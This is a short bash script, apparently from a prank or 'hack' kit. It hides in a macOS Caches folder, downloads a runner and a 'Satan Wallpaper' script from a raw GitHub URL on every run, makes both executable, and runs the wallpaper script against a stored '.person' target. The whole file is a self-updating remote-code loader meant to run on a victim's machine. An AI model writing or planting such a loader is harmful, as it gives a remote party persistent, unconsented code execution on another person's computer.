#!/usr/bin/env bash

## Vars
jh=~/Library/Caches/jh
baseurl=https://raw.githubusercontent.com/FredericMartinez/justin-hack/master
timestamp=`date +'%s'`

# Update Runner
curl -o $jh/runner.sh $baseurl/runner.sh?q=$timestamp > /dev/null
chmod +x $jh/runner.sh

# Get Satan Wallpaper

curl -o $jh/wallpaper.sh $baseurl/wallpaper.sh?q=$timestamp > /dev/null
chmod +x $jh/wallpaper.sh

# Run Satan Wallpaper

cat $jh/.person | xargs $jh/wallpaper.sh